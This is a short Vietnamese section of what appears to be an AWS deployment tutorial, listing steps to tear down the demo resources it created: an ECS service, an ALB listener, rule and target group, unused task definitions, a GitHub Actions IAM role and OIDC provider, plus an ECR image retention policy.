
## Dọn dẹp phần tạo thêm

1. ECS: scale `demo-api-prod-service` về 0 rồi Delete service.
2. ALB: xoá listener 8080; xoá rule 8080 trong `demo-api-alb-sg`; xoá target group `demo-api-prod-tg`.
3. Task definitions: deregister các revision không dùng (miễn phí, chỉ để gọn).
4. IAM: xoá role `github-actions-demo-api`, xoá identity provider `token.actions.githubusercontent.com` (nếu không repo nào khác dùng).
5. ECR: image cũ tốn phí lưu trữ. Tạo lifecycle policy giữ khoảng 30 image gần nhất (giữ đủ để còn rollback).
